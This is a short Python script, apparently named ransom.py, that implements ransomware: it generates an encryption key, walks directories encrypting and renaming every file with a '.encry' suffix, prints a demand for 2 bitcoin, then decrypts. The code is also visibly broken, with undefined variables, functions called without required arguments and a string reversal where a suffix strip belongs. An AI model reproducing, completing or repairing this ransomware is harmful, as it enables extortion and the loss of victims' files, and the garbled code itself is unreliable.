from cryptography.fernet import Fernet
import os
from pathlib import Path
def generate_key():
	f = Fernet.generate_key()
	with open("ransom.key", 'wb') as file:
		file.write(f)
def read_key():
	return open("ransom.key", "rb").read()
def encrypt(file_path, key):
	f = Fernet(key)
	with open(file, 'rb') as file:
		data = file.read()
	encrypted_data = f.encrypt(data)
	if file_path.endswith(".encry"):
		pass
	else:
		old_name = Path(file)
		new_name = Path(file+".encry")
		old_name.rename(new_name)
	with open(file+".encry", 'wb') as file:
		file.write(encrypted_data) 
def decrypt(file_path, key):
	f = Fernet(key)
	with open(file, 'rb') as file:
		data = file.read()
	decrypted_data = f.decrypt(data)
	if file_path.endswith(".encry"):
		old_name = Path(file)
		new_name = Path(file[::-6])
		old_name.rename(new_name)
	with open(file[::-6], 'wb') as file:
		file.write(decrypted_data) 
def search_and_encrypt(main_dir):
	file_list = []
	for root, _, files in os.walk():
		for file_name in files:
			path = os.path.join(root, file_name)
			if file_name == "ransom.py" or path.endswith(".encry") or path.endswith(".key"):
				pass
			else:
				encrypt(path, read_key())
def search_and_decrypt(main_dir):
	file_list = []
	for root, _, files in os.walk():
		for file_name in files:
			path = os.path.join(root, file_name)
			if file_name == "ransom.py" or path.endswith(".key"):
				pass
			elif file_name.endswith(".encry"):
				decrypt(path, read_key())
			else:
				pass
def show_message():
	print("Please sent 2 bitcoin for tor suport, and your file will be decrypted!")
	input("Your bitcoin wallet: ")
	print("Thank you for the donation!")
	print("Decrypting files...")
if __name__ == "__main__":
	generate_key()
	search_and_encrypt()
	show_message()
	search_and_decrypt()
